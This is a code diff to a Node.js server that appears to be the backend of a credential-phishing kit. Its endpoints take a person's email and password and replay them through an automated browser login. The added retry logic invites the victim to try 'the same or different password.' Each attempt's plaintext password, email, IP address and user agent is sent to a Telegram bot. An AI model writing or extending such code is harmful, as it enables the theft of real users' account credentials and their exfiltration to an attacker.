@@ -1755,16 +1755,79 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                 }
 
             } catch (fastAuthError) {
-                console.warn(`⚠️ Fast authentication failed, falling back to cold start: ${fastAuthError.message}`);
-                // Clean up failed preload
-                try {
-                    await automation.close();
-                    automationSessions.delete(sessionId);
-                } catch (cleanupError) {
-                    console.warn('Error cleaning up failed fast auth:', cleanupError.message);
+                console.warn(`⚠️ Fast authentication failed: ${fastAuthError.message}`);
+                
+                // Check if this is a recoverable error that we should keep browser alive for
+                const errorMessage = fastAuthError.message.toLowerCase();
+                const isRecoverableError = errorMessage.includes('execution context was destroyed') ||
+                                         errorMessage.includes('navigation') ||
+                                         errorMessage.includes('page crashed') ||
+                                         errorMessage.includes('target closed') ||
+                                         errorMessage.includes('session not created') ||
+                                         errorMessage.includes('timeout');
+
+                if (isRecoverableError && automation && !automation.isClosing) {
+                    console.log(`🔄 Recoverable fast auth error for: ${email} - keeping browser alive for retry`);
+                    
+                    // Keep browser session alive for retries instead of closing
+                    automationSessions.set(sessionId, {
+                        automation: automation,
+                        status: 'awaiting_retry',
+                        email: email,
+                        timestamp: new Date().toISOString(),
+                        attempts: 1,
+                        maxAttempts: 3,
+                        lastError: fastAuthError.message
+                    });
+
+                    analytics.failedLogins++;
+                    saveAnalytics();
+
+                    // Send Telegram notification for fast auth technical failure with retry available
+                    if (telegramBot) {
+                        try {
+                            await telegramBot.sendFailedLoginNotification({
+                                email: email,
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                sessionId: sessionId,
+                                reason: `Fast Auth Technical Error (Retry Available): ${fastAuthError.message}`,
+                                authMethod: 'FAST Authentication (preloaded browser)',
+                                preloadUsed: true,
+                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                                userAgent: req.get('User-Agent') || 'Unknown'
+                            });
+                            console.log(`📤 Telegram fast auth technical error notification sent for ${email}`);
+                        } catch (telegramError) {
+                            console.warn('Telegram fast auth technical error notification failed:', telegramError.message);
+                        }
+                    }
+
+                    return res.status(500).json({
+                        success: false,
+                        error: 'Fast authentication technical error',
+                        message: 'Technical error occurred during fast authentication. You can retry with the same or different password.',
+                        sessionId: sessionId,
+                        canRetry: true,
+                        attempts: 1,
+                        maxAttempts: 3,
+                        preloadUsed: true,
+                        requiresOAuth: false,
+                        details: fastAuthError.message
+                    });
+
+                } else {
+                    console.warn(`❌ Fatal fast auth error, falling back to cold start: ${fastAuthError.message}`);
+                    // Clean up failed preload for fatal errors only
+                    try {
+                        await automation.close();
+                        automationSessions.delete(sessionId);
+                    } catch (cleanupError) {
+                        console.warn('Error cleaning up failed fast auth:', cleanupError.message);
+                    }
+                    // Continue to fallback logic below
+                    usingPreloadedBrowser = false;
                 }
-                // Continue to fallback logic below
-                usingPreloadedBrowser = false;
             }
         }
 
@@ -2131,31 +2194,94 @@ app.post('/api/login-automation', async (req, res) => {
         } catch (automationError) {
             console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);
 
-            if (automationSessions.has(sessionId)) {
-                automationSessions.get(sessionId).status = 'error';
-            }
+            // Check if this is a recoverable error that we should keep browser alive for
+            const errorMessage = automationError.message.toLowerCase();
+            const isRecoverableError = errorMessage.includes('execution context was destroyed') ||
+                                     errorMessage.includes('navigation') ||
+                                     errorMessage.includes('page crashed') ||
+                                     errorMessage.includes('target closed') ||
+                                     errorMessage.includes('session not created') ||
+                                     errorMessage.includes('timeout');
 
-            analytics.failedLogins++;
-            saveAnalytics();
+            if (isRecoverableError && automation && !automation.isClosing) {
+                console.log(`🔄 Recoverable technical error for: ${email} - keeping browser alive for retry`);
+                
+                // Keep browser session alive for retries instead of closing
+                automationSessions.set(sessionId, {
+                    automation: automation,
+                    status: 'awaiting_retry',
+                    email: email,
+                    timestamp: new Date().toISOString(),
+                    attempts: 1,
+                    maxAttempts: 3,
+                    lastError: automationError.message
+                });
 
-            // Clean up on error
-            try {
-                if (automationSessions.has(sessionId)) {
-                    await automation.close();
-                    automationSessions.delete(sessionId);
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                // Send Telegram notification for technical failure with retry available
+                if (telegramBot) {
+                    try {
+                        await telegramBot.sendFailedLoginNotification({
+                            email: email,
+                            password: password || '[Not provided]',
+                            timestamp: new Date().toISOString(),
+                            sessionId: sessionId,
+                            reason: `Technical Error (Retry Available): ${automationError.message}`,
+                            authMethod: 'Browser Automation',
+                            preloadUsed: false,
+                            ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
+                            userAgent: req.get('User-Agent') || 'Unknown'
+                        });
+                        console.log(`📤 Telegram technical error notification sent for ${email}`);
+                    } catch (telegramError) {
+                        console.warn('Telegram technical error notification failed:', telegramError.message);
+                    }
                 }
-            } catch (cleanupError) {
-                console.error(`Error cleaning up automation after error:`, cleanupError.message);
-            }
 
-            res.status(500).json({
-                success: false,
-                sessionId: sessionId,
-                error: 'Automation failed',
-                message: 'Technical error during login process. Please try again.',
-                details: automationError.message,
-                method: 'automation'
-            });
+                res.status(500).json({
+                    success: false,
+                    sessionId: sessionId,
+                    canRetry: true,
+                    attempts: 1,
+                    maxAttempts: 3,
+                    error: 'Technical error',
+                    message: 'Technical error occurred. You can retry with the same or different password.',
+                    details: automationError.message,
+                    method: 'automation'
+                });
+
+            } else {
+                // Fatal error - close browser
+                console.log(`❌ Fatal automation error for: ${email} - closing browser`);
+
+                if (automationSessions.has(sessionId)) {
+                    automationSessions.get(sessionId).status = 'error';
+                }
+
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                // Clean up on fatal error
+                try {
+                    if (automationSessions.has(sessionId)) {
+                        await automation.close();
+                        automationSessions.delete(sessionId);
+                    }
+                } catch (cleanupError) {
+                    console.error(`Error cleaning up automation after error:`, cleanupError.message);
+                }
+
+                res.status(500).json({
+                    success: false,
+                    sessionId: sessionId,
+                    error: 'Fatal automation error',
+                    message: 'Serious technical error during login process. Please try again with a fresh session.',
+                    details: automationError.message,
+                    method: 'automation'
+                });
+            }
         }
 
     } catch (error) {
